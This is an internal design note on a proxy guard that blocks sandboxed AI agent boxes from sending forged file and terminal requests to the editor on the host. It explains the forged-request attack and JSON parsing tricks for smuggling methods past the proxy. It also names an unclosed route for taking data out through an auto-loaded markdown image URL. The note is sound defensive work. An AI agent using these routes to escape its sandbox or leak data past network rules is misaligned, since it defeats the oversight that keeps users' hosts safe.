---
name: acp-editor-host-access
description: a filtered session's box cannot reach the host through the editor; what it may still ask, and why lines are read strictly
subsystem: acp
sources: [internal/acpproxy/host_access.go, internal/acpproxy/proxy.go, internal/cli/acp_cmd.go, internal/cli/fork_acp.go, internal/box/editor_box_wait_live_test.go]
updated: 2026-11-03
---
ACP's `fs/*` and `terminal/*` run on the editor's computer, outside the box, and a login button can run
a command there. Any program in a box can write these straight onto the adapter's stdout: from inside a
real filtered box, forged requests reached the editor. The owner decided on 2026-11-03 that a filtered
session may not do this. Nobody decided for open or offline sessions, which keep the channel.

With `RunOpts.NoEditorHostAccess` (set where `a.acpCapture != nil`, this repo's "filtered" test):
- the editor's `fs`, `terminal` and `elicitation.url` capabilities are removed from `initialize`, also on
  replay and resume;
- a box may send only `session/update`, `session/request_permission`, a form-mode `elicitation/create`, and
  lines with no method (responses). Anything else is refused with an error, or dropped if it has no id, so a
  method ACP adds later is closed by default;
- login buttons are hidden at the last write, because a fork's hooks do not hide them.

Keep form questions open: Claude's `AskUserQuestion` depends on them (Zed advertises `elicitation.form`, and the
adapter keeps the tool enabled because of it), and a form can only ask the person. URL mode opens a link the box
chose, so it stays closed; Claude's MCP sign-in by link needs it and does not work in a filtered session.

Traps:
- **Box lines reach the editor whole in two places:** `pumpChild` and `answerInitialize`, and a new write of a
  box's line must go through `p.forEditor`. Replay's `process` drops requests. The other writes are `session/update`
  lines Coop builds, with box text inside.
- **Read lines strictly.** Go's JSON folds key case and keeps the last duplicate, so the proxy's own `parse` can
  see `session/update` where an editor sees `terminal/create`. A carriage return is whitespace to JSON and a line
  end to Java's `readLine`. `readBoxLine` refuses all of these.
- **Do not search bytes for a key.** A key can be written with JSON escapes (`auth\u004dethods`), which is why
  `HideAuthenticationMethods` decodes every line. Tool input can decode such an escape on its way into a test
  file, so tests build it at runtime.
- **The trace prints `box→editor` before the guard.** A `refused` line right after it means it never left.

Measured with this closed, one real prompt each: Claude, Codex and Gemini asked the editor for nothing and
wrote the file inside the box. Before it, Gemini read and wrote through the editor at host paths when
offered; Claude and Codex never asked. Grok could not be measured: it reported itself not signed in.
Dropped today with no effect in Zed: `_auth/status_update` (Claude) and `_x.ai/*` (Grok).

Not closed: **Zed loads a remote image in an agent's message by itself** (`resolve_agent_image` in its
`agent_ui.rs`), so `![x](https://example.org/?data=...)` can carry data out with no click, past the network rules.
A rewrite per line is not enough, because chunks can split the syntax anywhere; a task is filed. A `session/update`
can also name paths (tool call `locations`, resource links) the editor may show or open, and links a person can
click. The agent gets nothing back from those.

Proof: `host_access_test.go`, and `TestRestrictedNetworkBoxCannotReachTheHostThroughTheEditor` on real
Docker, which spends one short prompt.

## Changelog
- 2026-11-03 — created with the guard. Verified on real Docker: with the guard off the live test fails with
  the forged methods in the editor's list.
